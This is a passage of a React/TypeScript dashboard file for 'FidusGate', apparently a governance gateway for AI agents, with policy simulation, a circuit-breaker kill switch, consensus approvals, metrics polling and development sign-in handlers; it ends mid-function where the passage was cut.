import React, { useState, useEffect, useCallback, useRef, startTransition } from 'react';
import './App.css';
import { LedgerTab } from './tabs/LedgerTab';
import { ComplianceTab } from './tabs/ComplianceTab';
import { PolicyTab } from './tabs/PolicyTab';
import { ForensicsTab } from './tabs/ForensicsTab';
import { SandboxTab } from './tabs/SandboxTab';
import { Transaction, AuditReceipt, SecurityFinding } from '@fidusgate/core-types';
import { API_BASE, assertSafeResourceId } from './lib/api';
import { useTransactionAction } from './hooks/useTransactionAction';
import { ConnectedShell, type ConnectedView } from './connected/ConnectedShell';
import { ConnectedDecisions, type ReceiptLoadStatus } from './connected/ConnectedDecisions';
import { ConnectedVerifier, type ConnectedVerificationResult } from './connected/ConnectedVerifier';

export default function App() {
  const [session, setSession] = useState(0);
  // Remount every session-owned view on disconnect. Late mutations cannot refill
  // a subsequent user's state, including legacy forms and operation results.
  return <ConnectedApp key={session} onDisconnect={() => setSession(value => value + 1)} />;
}

function ConnectedApp({ onDisconnect }: { onDisconnect: () => void }) {
  // State variables
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [receipts, setReceipts] = useState<AuditReceipt[]>([]);
  const [isChainValid, setIsChainValid] = useState<boolean | null>(null);
  const [findings, setFindings] = useState<SecurityFinding[]>([]);
  
  // PLM Feedback & Gate Alignment States
  const [plmState, setPlmState] = useState<any>(null);
  const [ibpState, setIbpState] = useState<any>(null);
  const [budgetExtensions, setBudgetExtensions] = useState<any[]>([]);
  const [budgetExtensionAmount, setBudgetExtensionAmount] = useState<number>(10000);
  const [budgetExtensionReason, setBudgetExtensionReason] = useState<string>('');
  const [budgetExtensionLoading, setBudgetExtensionLoading] = useState(false);
  const [attestedClaims, setAttestedClaims] = useState<any>(null);
  const [pendingPatch, setPendingPatch] = useState<any>(null);
  const [driftState, setDriftState] = useState<any[]>([]);
  const [driftSyncLoading, setDriftSyncLoading] = useState(false);
  const [patchApplyLoading, setPatchApplyLoading] = useState(false);

  // Enterprise Simulator & Timeline States
  const [activePolicyCode, setActivePolicyCode] = useState('');
  const [simPrincipal, setSimPrincipal] = useState('sb:issuer:agent-80');
  const [simToolName, setSimToolName] = useState('write_file');
  const [simArgs, setSimArgs] = useState('{"path":"policy.cedar"}');
  const [simContext, setSimContext] = useState('{\n  "devops": {\n    "pipeline_passed": true,\n    "security_audited": false\n  }\n}');
  const [simOverrideMode, setSimOverrideMode] = useState(false);
  const [simDraftPolicy, setSimDraftPolicy] = useState('');
  const [simLoading, setSimLoading] = useState(false);
  const [simResult, setSimResult] = useState<any>(null);
  
  const [forensicLogs, setForensicLogs] = useState<any[]>([]);

  const [feedbackRole, setFeedbackRole] = useState('Auditor');
  const [feedbackComment, setFeedbackComment] = useState('');
  const [feedbackSeverity, setFeedbackSeverity] = useState<'info' | 'warn' | 'critical'>('warn');
  const [feedbackLoading, setFeedbackLoading] = useState(false);
  const [alignJustification, setAlignJustification] = useState('');
  const [alignLoading, setAlignLoading] = useState(false);
  
  // Development credentials are memory-only. Production auth remains fail-closed.
  const [authToken, setAuthToken] = useState<string | null>(null);
  const [authRole, setAuthRole] = useState<'developer' | 'admin' | 'auditor' | 'unauthenticated'>('unauthenticated');
  const [authEmail, setAuthEmail] = useState('admin@fidusgate.internal');
  const [authLoading, setAuthLoading] = useState(false);
  const [bootstrapKey, setBootstrapKey] = useState('');
  const [authError, setAuthError] = useState('');
  const sessionEpoch = useRef(0);
  const pollGeneration = useRef(0);
  const [connection, setConnection] = useState<'checking' | 'connected' | 'unavailable'>('checking');
  const [gatewayNotice, setGatewayNotice] = useState('');
  const [receiptStatus, setReceiptStatus] = useState<ReceiptLoadStatus>('unauthorized');

  // Dynamically resolve request headers with JWT Bearer Token
  const getHeaders = useCallback(() => {
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    if (authToken) {
      headers['Authorization'] = `Bearer ${authToken}`;
    }
    return headers;
  }, [authToken]);

  // Terminal Console state (declared before transaction action so onCreated can append)
  const [consoleLines, setConsoleLines] = useState<string[]>([
    'FidusGate Unified Security Shell v1.2.0 initialized.',
    'Environment and policy status are reported by the gateway when available.',
    'Standing by for live sandbox command execution. Type "help" to list workflows.',
  ]);
  const [consoleInput, setConsoleInput] = useState('');

  const transactionAction = useTransactionAction({
    getHeaders,
    onCreated: (tx) => {
      startTransition(() => {
        setTransactions((prev) => [tx, ...prev]);
        setConsoleLines((prev) => [
          ...prev,
          `[LEDGER] New Transaction Registered: ${tx.id} | Amount: ${tx.amount} ${tx.currency}`,
          tx.maskedPii
            ? '[PRIVACY] PII Filter Triggered. Sensitive fields masked successfully.'
            : '[PII] No direct PII detected. Stored transparently.',
        ]);
      });
    },
  });
  const {
    sender: txSender,
    setSender: setTxSender,
    recipient: txRecipient,
    setRecipient: setTxRecipient,
    amount: txAmount,
    setAmount: setTxAmount,
    currency: txCurrency,
    setCurrency: setTxCurrency,
    formAction: txFormAction,
    isPending: txLoading,
    state: txFormState,
  } = transactionAction;
  const txNotification = txFormState.notification;

  // Verifier tool states
  const [receiptInput, setReceiptInput] = useState('');
  const [verificationResult, setVerificationResult] = useState<ConnectedVerificationResult>({ status: 'idle', message: '' });
  const [verificationBusy, setVerificationBusy] = useState(false);
  const verificationVersion = useRef(0);
  const updateReceiptInput = (value: string) => {
    verificationVersion.current += 1;
    setReceiptInput(value);
    setVerificationBusy(false);
    setVerificationResult({ status: 'idle', message: '' });
  };
  const [latestAutofix, setLatestAutofix] = useState<{ target: string, replacement: string } | null>(null);
  const [activePlaybook, setActivePlaybook] = useState<string | null>(null);
  const consoleEndRef = useRef<HTMLDivElement | null>(null);
  const [showArchPanel, setShowArchPanel] = useState(false);
  const [selectedArchComp, setSelectedArchComp] = useState<string | null>('gateway');
  const [activeTab, setActiveTab] = useState<ConnectedView>('decisions');
  const [forensicSearch, setForensicSearch] = useState('');
  const [forensicStatusFilter, setForensicStatusFilter] = useState<'all' | 'success' | 'failed' | 'denied'>('all');

  // System Config & Cedar Co-Pilot States
  const [systemConfig, setSystemConfig] = useState<any>({ circuitBreakerActive: false, agentTokenBudget: 1000.0 });
  const [systemConfigLoading, setSystemConfigLoading] = useState(false);
  const [chatApplyLoading, setChatApplyLoading] = useState(false);

  // Conversational Chat Co-Pilot States
  interface ChatMessage {
    id: string;
    sender: 'user' | 'assistant';
    timestamp: string;
    text: string;
    cedarCode?: string;
  }
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [chatInput, setChatInput] = useState('');
  const [chatLoading, setChatLoading] = useState(false);
  const chatEndRef = useRef<HTMLDivElement | null>(null);

  // Guided Tour States
  const [tourActive, setTourActive] = useState(false);
  const [tourStep, setTourStep] = useState(0);

  const tourSteps = [
    {
      targetId: 'brand-header',
      title: '⚖️ Welcome to FidusGate!',
      body: 'FidusGate is a zero-trust runtime policy and security verification gateway for autonomous AI agents. Let\'s take a 2-minute tour of its capabilities.',
      position: 'bottom'
    },
    {
      targetId: 'oidc-widget',
      title: 'Development gateway session',
      body: 'Enter your development bootstrap key to request a role-scoped session. The gateway enforces authorization. This reference console does not provide production OIDC sign-in.',
      position: 'bottom'
    },
    {
      targetId: 'circuit-breaker-switch',
      title: '🚨 Emergency Circuit Breaker',
      body: 'Administrators can instantly freeze all autonomous agent activities by toggling the circuit breaker stop button.',
      position: 'bottom'
    },
    {
      targetId: 'copilot-playground',
      title: '🤖 Conversational Cedar Co-Pilot',
      body: 'Translate natural language security rules to valid Cedar syntax. Try chatting with Gemini to design new system guidelines!',
      position: 'right'
    },
    {
      targetId: 'policy-simulator',
      title: '🧪 Live Cedar Policy Simulator',
      body: 'Dry-run simulated agent tool-calls against production or draft rules. Verify ALLOW or DENY outcomes interactively.',
      position: 'left'
    },
    {
      targetId: 'syscall-monitor',
      title: '📡 Live Kernel System Call Auditing',
      body: 'Monitor simulated system calls in real-time. Unauthorized attempts trigger automatic lockouts to protect workspace integrity.',
      position: 'top'
    }
  ];

  const handleTourNext = () => {
    if (tourStep < tourSteps.length - 1) {
      if (tourSteps[tourStep + 1].targetId === 'copilot-playground' || tourSteps[tourStep + 1].targetId === 'policy-simulator') {
        setActiveTab('policy');
      }
      if (tourSteps[tourStep + 1].targetId === 'circuit-breaker-switch') setActiveTab('compliance');
      if (tourSteps[tourStep + 1].targetId === 'syscall-monitor') {
        setActiveTab('sandbox');
      }
      setTourStep(prev => prev + 1);
    } else {
      setTourActive(false);
    }
  };

  const handleTourPrev = () => {
    if (tourStep > 0) {
      if (tourSteps[tourStep - 1].targetId === 'copilot-playground' || tourSteps[tourStep - 1].targetId === 'policy-simulator') {
        setActiveTab('policy');
      }
      if (tourSteps[tourStep - 1].targetId === 'circuit-breaker-switch') setActiveTab('compliance');
      if (tourSteps[tourStep - 1].targetId === 'syscall-monitor') {
        setActiveTab('sandbox');
      }
      setTourStep(prev => prev - 1);
    }
  };

  const getTourTooltipStyle = (step: number) => {
    switch (step) {
      case 0: // Brand Header
        return { top: '160px', left: '50px' };
      case 1: // OIDC identity widget
        return { top: '220px', right: '50px' };
      case 2: // Emergency Kill-Switch
        return { top: '480px', left: '50px' };
      case 3: // Co-Pilot Chat
        return { top: '350px', left: '50px' };
      case 4: // Simulator
        return { top: '350px', left: '42%' };
      case 5: // Syscall Monitor
        return { bottom: '150px', right: '50px' };
      default:
        return { top: '50%', left: '50%', transform: 'translate(-50%, -50%)' };
    }
  };

  // Consensus Gating States
  const [consensusRequests, setConsensusRequests] = useState<any[]>([]);
  const [syscalls, setSyscalls] = useState<any[]>([]);
  const [consensusLoading, setConsensusLoading] = useState(false);

  // Live Prometheus State
  const [prometheusMetrics, setPrometheusMetrics] = useState<any>({
    policyEvaluationsAllow: 0,
    policyEvaluationsDeny: 0,
    ibpTokensBurned: 0,
    plmActiveDirectives: 0,
    devopsCompliance: { pipeline: 0, security: 0, drift: 0 },
    sandboxActiveContainers: 0,
    available: false,
    databaseStatus: 0,
    databaseLatencyMs: 0,
    latencyHistory: [],
    requestRateHistory: [],
    autoThrottleActive: 0
  });

  // Auto-scroll terminal console to bottom on every log change
  useEffect(() => {
    consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [consoleLines]);

  // Auto-scroll chat container
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [chatMessages]);

  // Update spotlight targets on active step change
  useEffect(() => {
    if (!tourActive) {
      document.querySelectorAll('.tour-highlight').forEach(el => {
        el.classList.remove('tour-highlight');
      });
      return;
    }

    document.querySelectorAll('.tour-highlight').forEach(el => {
      el.classList.remove('tour-highlight');
    });

    const activeStep = tourSteps[tourStep];
    if (activeStep && activeStep.targetId) {
      const target = document.getElementById(activeStep.targetId);
      if (target) {
        target.classList.add('tour-highlight');
        target.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }
  }, [tourActive, tourStep]);


  // Poll through the same authenticated API as every operation. Browser WebSocket
  // cannot supply the header required by the gateway; do not weaken that guard.
  const fetchData = useCallback(async () => {
    const epoch = sessionEpoch.current;
    const generation = ++pollGeneration.current;
    const current = () => epoch === sessionEpoch.current && generation === pollGeneration.current;
    try {
      const health = await fetch('/health', { headers: getHeaders(), signal: AbortSignal.timeout(8000) });
      const data = await health.json();
      if (!current()) return;
      const breakerActive = data.circuit_breaker_active || data.error === 'AGENTIC_CIRCUIT_BREAKER_ACTIVE';
      setConnection(health.ok || data.status === 'degraded' || breakerActive ? 'connected' : 'unavailable');
      setGatewayNotice(breakerActive ? 'Gateway reports its circuit breaker is active.' : '');
    } catch {
      if (!current()) return;
      setConnection('unavailable');
      setGatewayNotice('Health check unavailable. Protected reads may also be unavailable.');
    }
    if (!authToken || !current()) return;
    try {
      const paths = ['/transactions', '/receipts', '/findings', '/plm/state', '/ibp/state',
        '/auth/attested-claims', '/sandbox/patch', '/sandbox/drift', '/logs/commands',
        '/policy/active', '/system/config', '/consensus/requests', '/ibp/budget/extensions',
        '/receipts/verify-chain', '/policy/chat-history'];
      const results = await Promise.allSettled(paths.map(async path => {
        const response = await fetch(`${API_BASE}${path}`, { headers: getHeaders(), signal: AbortSignal.timeout(8000) });
        return { ok: response.ok, status: response.status, data: response.ok ? await response.json() : null };
      }));
      if (!current()) return;
      const result = (index: number) => {
        const item = results[index];
        return item.status === 'fulfilled' ? item.value : { ok: false, status: 0, data: null };
      };
      // Expired credentials end the whole session, not just its visible receipt list.
      if (results.some(item => item.status === 'fulfilled' && item.value.status === 401)) {
        sessionEpoch.current += 1;
        onDisconnect();
        return;
      }
      const [tx, receipt, finding, plm, ibp, claims, patch, drift, logs, policy, config, consensus, budgets, chain, chat] = paths.map((_, index) => result(index));
      setTransactions(tx.ok ? tx.data : []);
      setReceipts(receipt.ok ? receipt.data : []);
      setReceiptStatus(receipt.ok ? 'ready' : receipt.status === 403 ? 'unauthorized' : 'error');
      setIsChainValid(chain.ok && typeof chain.data.valid === 'boolean' ? chain.data.valid : null);
      setFindings(finding.ok ? finding.data : []);
      setPlmState(plm.ok ? plm.data : null);
      setIbpState(ibp.ok ? ibp.data : null);
      setAttestedClaims(claims.ok ? claims.data : null);
      setPendingPatch(patch.ok ? patch.data : null);
      setDriftState(drift.ok ? drift.data : []);
      setForensicLogs(logs.ok ? logs.data : []);
      setSystemConfig(config.ok ? config.data : null);
      setConsensusRequests(consensus.ok ? consensus.data : []);
      setBudgetExtensions(budgets.ok ? budgets.data : []);
      setChatMessages(chat.ok ? chat.data : []);
      setActivePolicyCode(policy.ok ? policy.data.code : '');
      if (policy.ok) setSimDraftPolicy(prev => prev || policy.data.code);
      if (results.some(item => item.status === 'rejected' || !item.value.ok)) {
        setGatewayNotice('Some gateway data is unavailable or restricted for this role. Unavailable records have been cleared.');
      }

      // Poll Port 3002 Prometheus metrics
      try {
        const metricsRes = await fetch('/metrics', { signal: AbortSignal.timeout(8000) });
        if (metricsRes.ok) {
          const text = await metricsRes.text();
          if (!current()) return;
          if (!text.includes('fidusgate_gateway_policy_evaluations_total')) throw new Error('Metrics unavailable');
          
          const parseMetricValue = (metricName: string, labelFilters: Record<string, string> = {}): number => {
            const lines = text.split('\n');
            for (const line of lines) {
              if (line.startsWith('#') || !line.trim()) continue;
              if (line.startsWith(metricName)) {
                let match = true;
                for (const [k, v] of Object.entries(labelFilters)) {
                  if (!line.includes(`${k}="${v}"`)) {
                    match = false;
                    break;
                  }
                }
                if (match) {
                  const parts = line.split(' ');
                  const val = parseFloat(parts[parts.length - 1]);
                  if (!isNaN(val)) return val;
                }
              }
            }
            return 0;
          };

          const allow = parseMetricValue('fidusgate_gateway_policy_evaluations_total', { decision: 'allow' });
          const deny = parseMetricValue('fidusgate_gateway_policy_evaluations_total', { decision: 'deny' });
          const tokens = parseMetricValue('fidusgate_ibp_tokens_burned_total');
          const directives = parseMetricValue('fidusgate_plm_active_directives');
          const dbStatus = parseMetricValue('fidusgate_database_status');
          const dbLatency = parseMetricValue('fidusgate_database_latency_ms');
          const activeContainers = parseMetricValue('fidusgate_sandbox_active_containers');
          const pipeline = parseMetricValue('fidusgate_devops_compliance_status', { gate: 'pipeline' });
          const security = parseMetricValue('fidusgate_devops_compliance_status', { gate: 'security' });
          const drift = parseMetricValue('fidusgate_devops_compliance_status', { gate: 'drift' });
          const autoThrottleActive = parseMetricValue('fidusgate_auto_throttle_active');

          setPrometheusMetrics((prev: any) => {
            const totalEvals = allow + deny;
            const prevTotal = (prev.policyEvaluationsAllow || 0) + (prev.policyEvaluationsDeny || 0);
            const requestRate = Math.max(0, totalEvals - prevTotal);
            
            const nextRequestRateHistory = [...prev.requestRateHistory.slice(-14), requestRate];
            const currentLatency = dbLatency;
            const nextLatencyHistory = [...prev.latencyHistory.slice(-14), currentLatency];

            return {
              available: true,
              policyEvaluationsAllow: allow,
              policyEvaluationsDeny: deny,
              ibpTokensBurned: tokens,
              plmActiveDirectives: directives,
              devopsCompliance: { pipeline, security, drift },
              sandboxActiveContainers: activeContainers,
              databaseStatus: dbStatus,
              databaseLatencyMs: dbLatency,
              latencyHistory: nextLatencyHistory,
              requestRateHistory: nextRequestRateHistory,
              autoThrottleActive: autoThrottleActive
            };
          });
        } else { throw new Error('Metrics unavailable'); }
      } catch {
        if (current()) setPrometheusMetrics((prev: Record<string, unknown>) => ({ ...prev, available: false }));
      }
    } catch (e) {
      if (!current()) return;
      setReceipts([]);
      setReceiptStatus('error');
      setIsChainValid(null);
      console.error('Failed to fetch data from security gateway', e);
    }
  }, [getHeaders, authToken, onDisconnect]);

  const handleSimulate = async (e: React.FormEvent) => {
    e.preventDefault();
    setSimLoading(true);
    setSimResult(null);

    try {
      let parsedArgs = {};
      try {
        parsedArgs = JSON.parse(simArgs);
      } catch (err) {
        alert('Args must be a valid JSON object');
        setSimLoading(false);
        return;
      }

      let parsedContext = {};
      try {
        parsedContext = JSON.parse(simContext);
      } catch (err) {
        alert('Context must be a valid JSON object');
        setSimLoading(false);
        return;
      }

      const payload: any = {
        principal: simPrincipal,
        toolName: simToolName,
        args: parsedArgs,
        context: parsedContext
      };

      if (simOverrideMode) {
        payload.policyOverride = simDraftPolicy;
      }

      const res = await fetch(`${API_BASE}/policy/simulate`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        const data = await res.json();
        setSimResult(data);
      } else {
        const err = await res.json();
        alert(`Simulation failed: ${err.error || err.message}`);
      }
    } catch (err: any) {
      console.error(err);
      alert('Network error during simulation');
    } finally {
      setSimLoading(false);
    }
  };

  const handleDownloadComplianceReceipt = async (logId: string) => {
    try {
      const safeLogId = assertSafeResourceId(logId, 'logId');
      const res = await fetch(`${API_BASE}/logs/compliance/${encodeURIComponent(safeLogId)}/export`, {
        headers: getHeaders()
      });

      if (res.ok) {
        const blob = await res.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `fidusgate-compliance-receipt-${safeLogId}.json`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.URL.revokeObjectURL(url);
      } else {
        const err = await res.json();
        alert(`Export failed: ${err.error || err.message || 'Unauthorized access'}`);
      }
    } catch (err: any) {
      console.error(err);
      alert('Failed to download compliance receipt.');
    }
  };

  const handleApplyPatch = async () => {
    setPatchApplyLoading(true);
    try {
      const res = await fetch(`${API_BASE}/sandbox/apply`, {
        method: 'POST',
        headers: getHeaders()
      });
      const data = await res.json();
      if (res.ok) {
        setConsoleLines(prev => [
          ...prev,
          `✅ [SecOps] Attested sandbox patch successfully applied and merged into host workspace.`
        ]);
        fetchData();
      } else {
        setConsoleLines(prev => [
          ...prev,
          `❌ [SecOps] Patch application failed: ${data.error}`
        ]);
      }
    } catch (err: any) {
      console.error(err);
    } finally {
      setPatchApplyLoading(false);
    }
  };

  const handleDriftSync = async () => {
    setDriftSyncLoading(true);
    try {
      const res = await fetch(`${API_BASE}/sandbox/drift-sync`, {
        method: 'POST',
        headers: getHeaders()
      });
      const data = await res.json();
      if (res.ok) {
        setConsoleLines(prev => [
          ...prev,
          `✅ [SecOps] Scoped CLAUDE.md memory map drift audit completed. Heatmap reset to ALIGNED.`
        ]);
        fetchData();
      } else {
        setConsoleLines(prev => [
          ...prev,
          `❌ [SecOps] Memory map sync failed: ${data.error}`
        ]);
      }
    } catch (err: any) {
      console.error(err);
    } finally {
      setDriftSyncLoading(false);
    }
  };

  const handleExportAuditReport = async () => {
    try {
      const policyRes = await fetch(`${API_BASE}/policy/active`, {
        headers: getHeaders()
      });
      if (!policyRes.ok) throw new Error('Active policy could not be read');
      const policyData = await policyRes.json();
      const policyCode = policyData.code || "";

      const report = {
        reportType: "Unsigned local gateway snapshot",
        verification: "This export is not a signed compliance attestation. Verify receipts separately.",
        reportId: `rep_${Math.floor(100000 + Math.random() * 900000)}`,
        timestamp: new Date().toISOString(),
        environment: "FidusGate Secure Sandbox Monorepo (gVisor optional)",
        assessedSession: {
          userEmail: authEmail,
          userRole: authRole,
        },
        databaseIntegrity: {
          totalAuditedEvents: forensicLogs.length,
          totalTransactions: transactions.length,
          verifiableReceiptsCount: receipts.length,
        },
        cedarGovernanceContext: {
          activeCedarPolicy: policyCode
        },
        transactions: transactions.map(t => ({
          transactionId: t.id,
          timestamp: t.timestamp,
          sender: t.sender,
          recipient: t.recipient,
          amount: t.amount,
          currency: t.currency,
          status: t.status
        })),
        auditedCommandLogs: forensicLogs.map((l: any) => ({
          logId: l.id,
          timestamp: l.timestamp,
          command: l.command,
          actor: l.user,
          role: l.role,
          outcome: l.status,
          exitCode: l.exitCode,
          cedarDecision: l.cedarDecision
        }))
      };

      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(report, null, 2));
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute("href", dataStr);
      downloadAnchor.setAttribute("download", `fidusgate-audit-report-${report.reportId}.json`);
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();

      setConsoleLines(prev => [
        ...prev,
        `🔒 [Compliance] Unsigned gateway snapshot successfully generated and downloaded (ID: ${report.reportId})`
      ]);
    } catch (err: any) {
      console.error("Failed to generate audit report:", err);
      setConsoleLines(prev => [
        ...prev,
        `❌ [Compliance] Failed to export gateway snapshot: ${err.message}`
      ]);
    }
  };

  useEffect(() => {
    let disposed = false;
    let timer: ReturnType<typeof setTimeout> | undefined;
    const poll = async () => {
      await fetchData();
      if (!disposed) timer = setTimeout(poll, 4000);
    };
    void poll();
    return () => {
      disposed = true;
      sessionEpoch.current += 1;
      if (timer) clearTimeout(timer);
    };
  }, [fetchData]);

  // Development bootstrap sign-in (production remains fail-closed).
  const handleOidcLogin = async (selectedRole: 'developer' | 'admin' | 'auditor') => {
    if (!bootstrapKey.trim() || authLoading) return;
    setAuthLoading(true);
    setAuthError('');
    try {
      let resolvedEmail = authEmail.trim();
      // Dynamically align default mock emails to the selected role for frictionless UX,
      // while preserving any custom email values typed by the user.
      if (!resolvedEmail || 
          resolvedEmail === 'developer@fidusgate.internal' || 
          resolvedEmail === 'admin@fidusgate.internal' || 
          resolvedEmail === 'auditor@fidusgate.internal' ||
          resolvedEmail === 'admin2@fidusgate.internal' ||
          resolvedEmail === 'developer2@fidusgate.internal' ||
          resolvedEmail === 'audit@fidusgate.internal') {
        if (selectedRole === 'developer') resolvedEmail = 'developer@fidusgate.internal';
        else if (selectedRole === 'admin') resolvedEmail = 'admin@fidusgate.internal';
        else if (selectedRole === 'auditor') resolvedEmail = 'auditor@fidusgate.internal';
        setAuthEmail(resolvedEmail);
      }

      const res = await fetch(`${API_BASE}/auth/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-fidusgate-bootstrap-key': bootstrapKey },
        body: JSON.stringify({ role: selectedRole, email: resolvedEmail })
      });
      
      if (res.ok) {
        const data = await res.json();
        if (typeof data.token !== 'string' || !['developer', 'admin', 'auditor'].includes(data.role)) throw new Error('Invalid session response');
        sessionEpoch.current += 1;
        setBootstrapKey('');
        setReceiptStatus('loading');
        setAuthToken(data.token);
        setAuthRole(data.role);
        
        setConsoleLines(prev => [
          ...prev,
          `🔑 [Demo only] Authenticated with a memory-only development session.`,
          `🧑‍💻 User: ${data.email} | Active Role: ${data.role.toUpperCase()}`,
          `🎫 Development bearer token held only in memory; production authentication is not implemented in this reference console.`
        ]);
      } else {
        const errorData = await res.json().catch(() => ({}));
        setAuthError(`Authentication failed: ${errorData.error || errorData.message || 'Gateway rejected sign-in.'}`);
      }
    } catch (err) {
      console.error(err);
      setAuthError('Could not establish a gateway session. Check the gateway and bootstrap key.');
    } finally {
      setAuthLoading(false);
    }
  };

  const handleOidcLogout = () => {
    sessionEpoch.current += 1;
    verificationVersion.current += 1;
    onDisconnect();
  };

  // Toggle Emergency Circuit Breaker (Kill-Switch)
  const handleToggleCircuitBreaker = async () => {
    if (authRole !== 'admin') {
      alert('Unauthorized: Only Admin users can trigger the global emergency circuit breaker.');
      return;
    }
    
    const targetState = !systemConfig?.circuitBreakerActive;
    setSystemConfigLoading(true);
    
    try {
      const res = await fetch(`${API_BASE}/system/config`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          circuitBreakerActive: targetState,
          agentTokenBudget: systemConfig?.agentTokenBudget ?? 1000.0
        })
      });
      
      if (res.ok) {
        const data = await res.json();
        setSystemConfig(data.config);
        
        setConsoleLines(prev => [
          ...prev,
          targetState 
            ? `🚨 [ALERT] GLOBAL EMERGENCY CIRCUIT BREAKER ACTIVATED! All agent operations have been instantly suspended.`
            : `✅ [ALERT] Emergency circuit breaker deactivated. Standard operations restored.`
        ]);
      } else {
        const err = await res.json();
        alert(`Failed to toggle circuit breaker: ${err.error || err.message}`);
      }
    } catch (err: any) {
      console.error(err);
      alert('Network error toggling circuit breaker.');
    } finally {
      setSystemConfigLoading(false);
    }
  };



  // Approve a pending multi-agent consensus action
  const handleApproveConsensus = async (actionId: string) => {
    if (authRole !== 'admin' && authRole !== 'developer' && authRole !== 'auditor') {
      alert('Unauthorized: Only authorized Admin, Developer, or Auditor SMEs can sign and attest consensus requests.');
      return;
    }

    setConsensusLoading(true);
    try {
      // Server issues the role-bound Ed25519 attestation after JWT auth.
      // Do not send client-invented mock signatures — they are rejected.
      const res = await fetch(`${API_BASE}/consensus/requests/approve`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          actionId
        })
      });

      if (res.ok) {
        setConsoleLines(prev => [
          ...prev,
          `✍️ [Consensus] Successfully attested consensus signature for Action ID: ${actionId}.`
        ]);
        fetchData();
      } else {
        const err = await res.json();
        alert(`Attestation failed: ${err.error || err.message}`);
      }
    } catch (err: any) {
      console.error(err);
      alert('Network error submitting attestation signature.');
    } finally {
      setConsensusLoading(false);
    }
  };

  // Admin override to unlock a dangerous consensus request block
  const handleOverrideConsensus = async (actionId: string) => {
    if (authRole !== 'admin') {
      alert('Unauthorized: Only an authorized Administrator decideer can override AI Auditor security blocks.');
      return;
    }

    setConsensusLoading(true);
    try {
      const safeActionId = assertSafeResourceId(actionId, 'actionId');
      const res = await fetch(`${API_BASE}/consensus/requests/${encodeURIComponent(safeActionId)}/override`, {
        method: 'POST',
        headers: getHeaders()
      });

      if (res.ok) {
        setConsoleLines(prev => [
          ...prev,
          `🔓 [Consensus] Administrator override applied. Action ID: ${actionId} successfully unlocked for voting.`
        ]);
        fetchData();
      } else {
        const err = await res.json();
        alert(`Override failed: ${err.error || err.message}`);
      }
    } catch (err: any) {
      console.error(err);
      alert('Network error submitting administrator override.');
    } finally {
      setConsensusLoading(false);
    }
  };

  // Submit Feedback
  const handleLogFeedback = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!feedbackComment.trim()) return;

    setFeedbackLoading(true);
    try {
      const res = await fetch(`${API_BASE}/plm/feedback`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          role: feedbackRole,
          comment: feedbackComment,
          severity: feedbackSeverity
        })
      });

      if (res.ok) {
        const data = await res.json();
        const loggedComment = feedbackComment;
        setFeedbackComment('');
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          `⚠️ [PLM] Active Feedback Logged: [${feedbackSeverity.toUpperCase()}] from ${feedbackRole}: "${loggedComment}"`,
          data.aligned ? `✅ [GATE] Gate remains aligned (Info severity).` : `🚨 [GATE] GATE LOCKED! Code commits are forbidden until aligned.`
        ]);
      } else {
        const err = await res.json();
        alert(`Failed to log feedback: ${err.error}`);
      }
    } catch (error) {
      console.error(error);
      alert('Failed to connect to Secure Gateway.');
    } finally {
      setFeedbackLoading(false);
    }
  };

  // Align Feedback / Release Gate
  const handleAlignFeedback = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!alignJustification.trim()) return;

    setAlignLoading(true);
    try {
      const res = await fetch(`${API_BASE}/plm/feedback-align`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          requirementId: plmState?.activeRequirementId || 'REQ-101',
          justification: alignJustification
        })
      });

      if (res.ok) {
        setAlignJustification('');
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          `✅ [PLM] Alignment report submitted successfully for Requirement: ${plmState?.activeRequirementId || 'REQ-101'}`,
          `🛡️ [GATE] GATE RELEASED! Code commits are now authorized.`
        ]);
      } else {
        const err = await res.json();
        alert(`Failed to align feedback: ${err.error}`);
      }
    } catch (error) {
      console.error(error);
      alert('Failed to connect to Secure Gateway.');
    } finally {
      setAlignLoading(false);
    }
  };

  // Create Budget Extension Request
  const handleCreateBudgetExtensionRequest = async (e: React.FormEvent) => {
    e.preventDefault();
    if (budgetExtensionAmount <= 0 || !budgetExtensionReason.trim()) return;
    setBudgetExtensionLoading(true);
    try {
      const res = await fetch(`${API_BASE}/ibp/budget/request-extension`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          requestedAmount: Number(budgetExtensionAmount),
          reason: budgetExtensionReason
        })
      });
      if (res.ok) {
        setBudgetExtensionReason('');
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          `💸 [IBP] Submitted Budget Extension Request: Amount: ${budgetExtensionAmount} | Reason: "${budgetExtensionReason}"`
        ]);
      } else {
        const err = await res.json();
        alert(`Failed to request budget extension: ${err.error || err.message || 'Unknown error'}`);
      }
    } catch (e: any) {
      alert(`Error creating budget extension request: ${e.message}`);
    } finally {
      setBudgetExtensionLoading(false);
    }
  };

  // Approve Budget Extension Request
  const handleApproveBudgetExtension = async (id: string) => {
    try {
      const res = await fetch(`${API_BASE}/ibp/budget/approve-extension`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({ id })
      });
      if (res.ok) {
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          `✅ [IBP] Budget Extension Approved for ID: ${id}. Active Token Budget expanded!`
        ]);
      } else {
        const err = await res.json();
